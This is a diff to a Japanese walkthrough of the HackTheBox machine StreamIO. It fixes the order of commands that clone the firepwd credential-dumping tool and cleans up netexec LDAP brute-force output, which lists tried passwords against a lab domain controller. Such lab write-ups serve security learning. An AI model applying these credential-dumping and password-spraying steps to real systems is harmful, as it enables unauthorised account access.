@@ -1102,8 +1102,6 @@ winpeasでみつけたdbファイルとほかに、クレデンシャルダン�
 ```
 ここでツールをダウンロード
 ```sh
-└─$ cd firepwd
-
 └─$ git clone https://github.com/lclevy/firepwd.git       
 Cloning into 'firepwd'...
 remote: Enumerating objects: 88, done.
@@ -1112,6 +1110,8 @@ remote: Compressing objects: 100% (8/8), done.
 remote: Total 88 (delta 2), reused 3 (delta 0), pack-reused 80 (from 1)
 Receiving objects: 100% (88/88), 239.08 KiB | 4.98 MiB/s, done.
 Resolving deltas: 100% (41/41), done.
+
+└─$ cd firepwd
 
 └─$ uv init -p 3.13       
 Initialized project `firepwd`
@@ -1194,9 +1194,9 @@ yoshihideとJDgoddでブルートフォースログイン、結果jdgoddでロ�
 └─$ netexec ldap 10.129.234.107 -u yohsihide -p passwords.txt
 LDAP        10.129.234.107  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
 LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:JDg0dd1s@d0p3cr3@t0r 
-LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:n1kk1sd0p3t00:)' 
-LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:paddpadd@12' 
-LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:password@12' 
+LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:n1kk1sd0p3t00:)
+LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:paddpadd@12
+LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:password@12 
 
 └─$ netexec ldap 10.129.234.107 -u jdgodd -p passwords.txt
 LDAP        10.129.234.107  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
